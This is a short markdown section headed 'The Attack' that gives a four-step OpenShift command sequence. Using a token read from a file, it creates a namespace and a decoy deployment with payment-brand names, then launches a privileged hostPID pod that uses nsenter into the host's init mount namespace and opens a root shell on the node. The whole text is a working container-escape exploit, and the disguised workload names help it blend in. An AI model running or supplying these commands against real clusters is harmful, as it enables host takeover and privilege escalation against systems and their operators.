### The Attack

```bash
# 1. Create a namespace
oc --token $(cat token) create namespace payments-v2

# 2. Deploy a standard app
oc --token $(cat token) -n payments-v2 create deployment mastercard-v2 --image alpine --port=8080 -- sleep 50000

# 3. Run a privileged pod with hostPID access (Container Escape vector)
oc --token $(cat token) run -n payments-v2 visa-processor --restart=Never --image alpine \
--overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"securityContext":{"privileged":true}}]}}'

# 4. Access the root shell
oc --token $(cat token) -n payments-v2 rsh visa-processor
```